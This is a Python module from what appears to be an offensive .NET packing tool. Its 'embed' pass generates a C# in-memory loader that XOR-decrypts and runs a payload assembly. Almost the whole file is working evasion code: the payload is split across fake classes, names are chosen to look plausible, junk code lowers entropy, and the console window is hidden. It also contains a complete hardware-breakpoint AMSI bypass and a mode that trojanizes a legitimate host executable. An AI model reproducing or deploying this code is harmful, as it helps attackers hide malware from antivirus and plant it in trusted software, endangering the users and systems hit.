"""In-memory embedding pass — wraps assembly in a loader that decrypts and loads at runtime.

The loader is designed to resist static analysis by:
- Fragmenting the encrypted payload across multiple fake classes
- Using plausible identifier names (not random hex)
- Including junk code to reduce Shannon entropy
- Hiding the console window (WinExe subsystem)
"""

from __future__ import annotations

import base64
import os
import secrets
import shutil
import subprocess
import tempfile
from pathlib import Path

from penumbra.types import PassConfig

# ── Heuristic-bypass naming ─────────────────────────────────────────────

_VERBS = [
    "Get", "Set", "Create", "Update", "Delete", "Process", "Handle",
    "Parse", "Format", "Validate", "Transform", "Convert", "Load",
    "Save", "Read", "Write", "Open", "Close", "Init", "Reset",
    "Build", "Resolve", "Execute", "Dispatch", "Register", "Configure",
]

_NOUNS = [
    "Service", "Config", "Data", "Context", "Manager", "Factory",
    "Handler", "Provider", "Repository", "Controller", "Adapter",
    "Processor", "Validator", "Formatter", "Converter", "Builder",
    "Resolver", "Dispatcher", "Registry", "Cache", "Buffer",
    "Channel", "Pipeline", "Session", "Token", "Descriptor",
]

_FIELD_PREFIXES = [
    "current", "default", "cached", "internal", "primary",
    "active", "pending", "last", "next", "base",
]

_TYPES_FOR_JUNK = [
    "int", "string", "bool", "double", "long", "float",
]


def _plausible_name() -> str:
    """Generate a plausible-looking identifier like 'GetServiceHandler'."""
    return secrets.choice(_VERBS) + secrets.choice(_NOUNS)


def _plausible_class() -> str:
    return secrets.choice(_NOUNS) + secrets.choice(_NOUNS)


def _plausible_field() -> str:
    return secrets.choice(_FIELD_PREFIXES) + secrets.choice(_NOUNS)


# ── Payload fragmentation ───────────────────────────────────────────────

_CHUNK_SIZE = 8192  # ~8KB per fragment — keeps each string a reasonable size


def _fragment_payload(payload_b64: str, chunk_size: int = _CHUNK_SIZE) -> list[str]:
    """Split Base64 payload into chunks."""
    return [payload_b64[i:i + chunk_size] for i in range(0, len(payload_b64), chunk_size)]


# ── Junk code generation (entropy reduction) ────────────────────────────

def _generate_junk_class(used_names: set[str] | None = None) -> str:
    """Generate a fake class with plausible methods and string constants."""
    cls = _plausible_class()
    if used_names is not None:
        counter = 0
        while cls in used_names:
            cls = _plausible_class() + str(counter)
            counter += 1
        used_names.add(cls)
    lines = [f"internal sealed class {cls}", "{"]

    # Add 3-5 fake fields
    used_fields: set[str] = set()
    for _ in range(secrets.randbelow(3) + 3):
        t = secrets.choice(_TYPES_FOR_JUNK)
        name = _plausible_field()
        while name in used_fields:
            name = _plausible_field() + str(len(used_fields))
        used_fields.add(name)
        if t == "string":
            # Low-entropy strings that bring down the overall Shannon entropy
            val = secrets.choice([
                "The quick brown fox jumps over the lazy dog",
                "Lorem ipsum dolor sit amet consectetur adipiscing elit",
                "Configuration loaded successfully from default path",
                "Initializing service pipeline with default parameters",
                "Processing batch operation completed without errors",
                "Application settings have been validated and applied",
                "The system has been configured for optimal performance",
                "Data transformation pipeline initialized successfully",
            ])
            lines.append(f'    private static readonly {t} {name} = "{val}";')
        elif t == "bool":
            lines.append(f"    private static readonly {t} {name} = false;")
        elif t == "int":
            lines.append(f"    private static readonly {t} {name} = {secrets.randbelow(10000)};")
        elif t == "double":
            lines.append(f"    private static readonly {t} {name} = {secrets.randbelow(100)}.0;")
        elif t == "long":
            lines.append(f"    private static readonly {t} {name} = {secrets.randbelow(100000)}L;")
        else:
            lines.append(f"    private static readonly {t} {name} = {secrets.randbelow(100)}.0f;")

    # Add 2-3 fake methods
    used_methods: set[str] = set()
    for _ in range(secrets.randbelow(2) + 2):
        method = _plausible_name()
        while method in used_methods:
            method = _plausible_name() + str(len(used_methods))
        used_methods.add(method)
        ret = secrets.choice(["void", "bool", "int", "string"])
        lines.append(f"    internal static {ret} {method}()")
        lines.append("    {")
        if ret == "void":
            lines.append(f'        Console.WriteLine("{_plausible_name()}");')
        elif ret == "bool":
            lines.append("        return true;")
        elif ret == "int":
            lines.append(f"        return {secrets.randbelow(256)};")
        else:
            lines.append(f'        return "{_plausible_name()}";')
        lines.append("    }")

    lines.append("}")
    return "\n".join(lines)


# ── HWBP+VEH AMSI bypass (patchless) ──────────────────────────────────

def _hwbp_veh_bypass_cs(cls_name: str, method_name: str, *, public: bool) -> str:
    """Generate C# source for patchless AMSI bypass via HWBP+VEH.

    Sets a hardware breakpoint on AmsiScanBuffer and intercepts via
    Vectored Exception Handler to neutralize it without patching memory.

    NOTE: CLR nLoadImage unhook is planned but not yet stable.
    See nextsteps.md for the implementation roadmap.
    """
    vis = "public" if public else "internal"
    addr_field = _plausible_field()
    handler_field = _plausible_field()
    return (
        "using System;\n"
        "using System.Runtime.InteropServices;\n\n"
        f"{vis} static class {cls_name}\n"
        "{{\n"
        f"    private static IntPtr {addr_field} = IntPtr.Zero;\n\n"
        "    private delegate int VehDelegate(IntPtr info);\n"
        f"    private static readonly VehDelegate {handler_field} = VehCallback;\n\n"
        "    [StructLayout(LayoutKind.Sequential)]\n"
        "    private struct EXCEPTION_RECORD\n"
        "    {{\n"
        "        public uint ExceptionCode;\n"
        "        public uint ExceptionFlags;\n"
        "        public IntPtr ExceptionRecord;\n"
        "        public IntPtr ExceptionAddress;\n"
        "        public uint NumberParameters;\n"
        "    }}\n\n"
        "    [StructLayout(LayoutKind.Sequential)]\n"
        "    private struct EXCEPTION_POINTERS\n"
        "    {{\n"
        "        public IntPtr ExceptionRecord;\n"
        "        public IntPtr ContextRecord;\n"
        "    }}\n\n"
        f"    {vis} static void {method_name}()\n"
        "    {{\n"
        "        try\n"
        "        {{\n"
        '            var lib = LoadLibrary("am" + "si.d" + "ll");\n'
        "            if (lib != IntPtr.Zero)\n"
        "            {{\n"
        '                {addr_field} = GetProcAddress(lib, "Amsi" + "Scan" + "Buffer");\n'
        f"                if ({addr_field} != IntPtr.Zero)\n"
        "                {{\n"
        f"                    AddVectoredExceptionHandler(1, {handler_field});\n"
        f"                    SetHwBp({addr_field});\n"
        "                }}\n"
        "            }}\n"
        "        }}\n"
        "        catch {{ }}\n"
        "    }}\n\n"
        "    private static int VehCallback(IntPtr infoPtr)\n"
        "    {{\n"
        "        var ep = Marshal.PtrToStructure<EXCEPTION_POINTERS>(infoPtr);\n"
        "        var rec = Marshal.PtrToStructure<EXCEPTION_RECORD>(ep.ExceptionRecord);\n\n"
        "        if (rec.ExceptionCode != 0x80000004)\n"
        "            return 0;\n\n"
        f"        if (rec.ExceptionAddress != {addr_field})\n"
        "            return 0;\n\n"
        "        var rsp = Marshal.ReadIntPtr(ep.ContextRecord, 0x98);\n"
        "        var retAddr = Marshal.ReadIntPtr(rsp);\n"
        "        var amsiResultPtr = Marshal.ReadIntPtr(rsp + 0x28);\n\n"
        "        if (amsiResultPtr != IntPtr.Zero)\n"
        "            Marshal.WriteInt32(amsiResultPtr, 0);\n\n"
        "        Marshal.WriteIntPtr(ep.ContextRecord, 0xF8, retAddr);\n"
        "        Marshal.WriteIntPtr(ep.ContextRecord, 0x98, rsp + 8);\n"
        "        Marshal.WriteIntPtr(ep.ContextRecord, 0x78, IntPtr.Zero);\n\n"
        "        return -1;\n"
        "    }}\n\n"
        "    private static void SetHwBp(IntPtr addr)\n"
        "    {{\n"
        "        var tid = GetCurrentThreadId();\n"
        "        var th = OpenThread(0x001A, false, tid);\n"
        "        if (th == IntPtr.Zero) return;\n\n"
        "        var ctx = Marshal.AllocHGlobal(1232);\n"
        "        try\n"
        "        {{\n"
        "            for (int i = 0; i < 1232; i++)\n"
        "                Marshal.WriteByte(ctx, i, 0);\n\n"
        "            Marshal.WriteInt32(ctx, 0x30, 0x00100010);\n"
        "            GetThreadContext(th, ctx);\n\n"
        "            Marshal.WriteIntPtr(ctx, 0x350, addr);\n"
        "            var dr7 = (long)Marshal.ReadIntPtr(ctx, 0x370);\n"
        "            Marshal.WriteIntPtr(ctx, 0x370, new IntPtr(dr7 | 0x1));\n\n"
        "            Marshal.WriteInt32(ctx, 0x30, 0x00100010);\n"
        "            SetThreadContext(th, ctx);\n"
        "        }}\n"
        "        finally\n"
        "        {{\n"
        "            Marshal.FreeHGlobal(ctx);\n"
        "            CloseHandle(th);\n"
        "        }}\n"
        "    }}\n\n"
        "    // ── P/Invoke ───────────────────────────────────────────\n\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr LoadLibrary(string n);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr AddVectoredExceptionHandler(\n"
        "        uint first, VehDelegate handler);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern uint GetCurrentThreadId();\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr OpenThread(uint access, bool inherit, uint tid);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern bool GetThreadContext(IntPtr hThread, IntPtr ctx);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern bool SetThreadContext(IntPtr hThread, IntPtr ctx);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern bool CloseHandle(IntPtr h);\n"
        "}}\n"
    ).format(addr_field=addr_field)


# ── Loader generation ───────────────────────────────────────────────────

def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt data with a repeating key."""
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def _generate_loader_project(
    payload_b64: str, key_b64: str, project_dir: Path
) -> None:
    """Generate a full C# loader project with fragmented payload and junk code."""
    chunks = _fragment_payload(payload_b64)

    # Track used class names to avoid collisions
    used_class_names: set[str] = set()

    # Main class name and identifiers
    main_cls = _plausible_class()
    used_class_names.add(main_cls)
    entry_method = _plausible_name()
    key_field = _plausible_field()
    result_var = _plausible_field()
    asm_var = _plausible_field()
    ep_var = _plausible_field()
    args_var = _plausible_field()
    idx_var = _plausible_field()
    plain_var = _plausible_field()

    # Reserve AMSI bypass class name early to avoid collisions
    amsi_cls = _plausible_class()
    used_class_names.add(amsi_cls)
    amsi_method = _plausible_name()

    # Generate fragment holder classes — each holds a chunk as a static field
    fragment_classes: list[str] = []
    fragment_refs: list[str] = []  # "ClassName.FieldName" references for reassembly

    for i, chunk in enumerate(chunks):
        # Ensure unique class names by appending index if collision
        cls_name = _plausible_class()
        while cls_name in used_class_names:
            cls_name = _plausible_class() + str(i)
        used_class_names.add(cls_name)
        field_name = _plausible_field()
        fragment_classes.append(
            f'internal static class {cls_name}\n{{\n'
            f'    internal static readonly string {field_name} =\n'
            f'        "{chunk}";\n'
            f'}}\n'
        )
        fragment_refs.append(f"{cls_name}.{field_name}")

    # Build the reassembly expression
    if len(fragment_refs) == 1:
        reassemble_expr = fragment_refs[0]
    else:
        reassemble_expr = " + ".join(fragment_refs)

    # Generate 5-8 junk classes for entropy reduction
    junk_classes: list[str] = []
    for j in range(secrets.randbelow(4) + 5):
        cls = _generate_junk_class(used_class_names)
        junk_classes.append(cls)

    # Write .csproj (WinExe = hide console)
    (project_dir / "Loader.csproj").write_text(
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        "  <PropertyGroup>\n"
        "    <OutputType>WinExe</OutputType>\n"
        "    <TargetFramework>net8.0</TargetFramework>\n"
        "    <Nullable>enable</Nullable>\n"
        "    <ImplicitUsings>enable</ImplicitUsings>\n"
        "  </PropertyGroup>\n"
        "</Project>\n"
    )

    # Write AmsiBypass.cs — HWBP+VEH bypass (patchless, sets hardware breakpoint
    # on AmsiScanBuffer and intercepts via Vectored Exception Handler)
    (project_dir / "AmsiBypass.cs").write_text(
        _hwbp_veh_bypass_cs(amsi_cls, amsi_method, public=False)
    )

    # Write Program.cs — the loader (calls AMSI bypass before Assembly.Load)
    program_cs = (
        "using System;\n"
        "using System.Reflection;\n\n"
        f"internal static class {main_cls}\n"
        "{\n"
        f'    private static readonly string {key_field} = "{key_b64}";\n\n'
        f"    private static void {entry_method}(string[] args)\n"
        "    {\n"
        f"        {amsi_cls}.{amsi_method}();\n\n"
        f"        var {result_var} = Convert.FromBase64String({reassemble_expr});\n"
        f"        var {idx_var} = Convert.FromBase64String({key_field});\n\n"
        f"        var {plain_var} = new byte[{result_var}.Length];\n"
        f"        for (var i = 0; i < {result_var}.Length; i++)\n"
        f"            {plain_var}[i] = (byte)({result_var}[i]"
        f" ^ {idx_var}[i % {idx_var}.Length]);\n\n"
        f"        var {asm_var} = Assembly.Load({plain_var});\n"
        f"        var {ep_var} = {asm_var}.EntryPoint;\n"
        f"        var {args_var} = {ep_var}!.GetParameters().Length > 0\n"
        f"            ? new object?[] {{ args }}\n"
        f"            : Array.Empty<object?>();\n"
        f"        {ep_var}.Invoke(null, {args_var});\n"
        "    }\n\n"
        f"    private static void Main(string[] args) => {entry_method}(args);\n"
        "}\n"
    )
    (project_dir / "Program.cs").write_text(program_cs)

    # Write fragment files
    for i, frag_src in enumerate(fragment_classes):
        (project_dir / f"Fragment{i}.cs").write_text(
            "using System;\n\n" + frag_src
        )

    # Write junk files
    for i, junk_src in enumerate(junk_classes):
        (project_dir / f"Module{i}.cs").write_text(
            "using System;\n\n" + junk_src
        )


# ── Pass implementation ─────────────────────────────────────────────────

class DotnetEmbedPass:
    """Wrap the assembly in an in-memory loader with XOR-encrypted payload.

    Two modes:
    - Default: generate a new loader from scratch (fragmented, junk code, WinExe)
    - --host: inject loader code into an existing legitimate .NET assembly

    Features (default mode):
    - Payload fragmented across multiple classes (defeats blob scanning)
    - Plausible identifier names (defeats obfuscation heuristics)
    - Junk code with low-entropy strings (reduces Shannon entropy)
    - WinExe subsystem (hides console window)
    """

    opt_in = True  # Not included in default pass list; use --embed to enable

    @property
    def name(self) -> str:
        return "embed"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        if not shutil.which("dotnet"):
            raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")

        host_path = config.extra.get("host")
        if host_path and isinstance(host_path, str):
            return self._trojanize(data, Path(host_path))
        return self._generate_loader(data)

    def _generate_loader(self, data: bytes) -> bytes:
        """Generate a standalone loader from scratch."""
        key = os.urandom(32)
        encrypted = _xor_encrypt(data, key)

        payload_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")

        tmp_dir = tempfile.mkdtemp(prefix="penumbra_loader_")
        tmp_path = Path(tmp_dir)

        try:
            _generate_loader_project(payload_b64, key_b64, tmp_path)

            out_dir = tmp_path / "out"
            result = subprocess.run(
                ["dotnet", "publish", str(tmp_path),
                 "-c", "Release", "-o", str(out_dir), "--nologo"],
                capture_output=True,
            )

            if result.returncode != 0:
                stderr = result.stderr.decode("utf-8", errors="replace")
                stdout = result.stdout.decode("utf-8", errors="replace")
                raise RuntimeError(
                    f"Loader build failed:\n{stderr}\n{stdout}"
                )

            dll_path = out_dir / "Loader.dll"
            if not dll_path.exists():
                files = [f.name for f in out_dir.iterdir()] if out_dir.exists() else []
                raise RuntimeError(f"Loader output not found. Files: {files}")

            return dll_path.read_bytes()
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)

    def _build_amsi_bypass_dll(self) -> bytes:
        """Compile a tiny .NET Framework 4.x AMSI bypass DLL."""
        tmp_dir = tempfile.mkdtemp(prefix="penumbra_amsi_")
        tmp_path = Path(tmp_dir)

        try:
            (tmp_path / "Bypass.csproj").write_text(
                '<Project Sdk="Microsoft.NET.Sdk">\n'
                "  <PropertyGroup>\n"
                "    <OutputType>Library</OutputType>\n"
                "    <TargetFramework>netstandard2.0</TargetFramework>\n"
                "    <LangVersion>10</LangVersion>\n"
                "  </PropertyGroup>\n"
                "</Project>\n"
            )

            cls = _plausible_class()
            method = _plausible_name()

            (tmp_path / "Bypass.cs").write_text(
                _hwbp_veh_bypass_cs(cls, method, public=True)
            )

            out_dir = tmp_path / "out"
            result = subprocess.run(
                ["dotnet", "publish", str(tmp_path),
                 "-c", "Release", "-o", str(out_dir), "--nologo"],
                capture_output=True,
            )

            if result.returncode != 0:
                stderr = result.stderr.decode("utf-8", errors="replace")
                raise RuntimeError(f"AMSI bypass build failed: {stderr}")

            dll = out_dir / "Bypass.dll"
            return dll.read_bytes()
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)

    def _trojanize(self, data: bytes, host_path: Path) -> bytes:
        """Inject payload into an existing .NET host binary via the C# worker."""
        key = os.urandom(32)
        encrypted = _xor_encrypt(data, key)

        payload_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")

        # Build a tiny AMSI bypass DLL to embed alongside the payload
        amsi_dll = self._build_amsi_bypass_dll()
        amsi_b64 = base64.b64encode(amsi_dll).decode("ascii")

        worker_project = Path(__file__).resolve().parent / "worker"

        tmp_host = tempfile.NamedTemporaryFile(suffix=".exe", delete=False)
        tmp_out = tempfile.NamedTemporaryFile(suffix=".exe", delete=False)
        tmp_payload = tempfile.NamedTemporaryFile(suffix=".b64", delete=False)
        tmp_key = tempfile.NamedTemporaryFile(suffix=".key", delete=False)
        tmp_amsi = tempfile.NamedTemporaryFile(suffix=".b64", delete=False)

        tmp_host_path = Path(tmp_host.name)
        tmp_out_path = Path(tmp_out.name)
        tmp_payload_path = Path(tmp_payload.name)
        tmp_key_path = Path(tmp_key.name)
        tmp_amsi_path = Path(tmp_amsi.name)

        for f in (tmp_host, tmp_out, tmp_payload, tmp_key, tmp_amsi):
            f.close()

        try:
            tmp_host_path.write_bytes(host_path.read_bytes())
            tmp_payload_path.write_text(payload_b64)
            tmp_key_path.write_text(key_b64)
            tmp_amsi_path.write_text(amsi_b64)

            cmd = [
                "dotnet", "run", "--project", str(worker_project),
                "--", "--input", str(tmp_host_path),
                "--output", str(tmp_out_path),
                "--passes", "trojanize",
                "--payload-file", str(tmp_payload_path),
                "--key-file", str(tmp_key_path),
                "--amsi-file", str(tmp_amsi_path),
            ]

            result = subprocess.run(cmd, capture_output=True)

            if result.returncode != 0:
                stderr = result.stderr.decode("utf-8", errors="replace")
                raise RuntimeError(f"Trojanize failed: {stderr}")

            return tmp_out_path.read_bytes()
        finally:
            for p in (tmp_host_path, tmp_out_path, tmp_payload_path,
                      tmp_key_path, tmp_amsi_path):
                p.unlink(missing_ok=True)
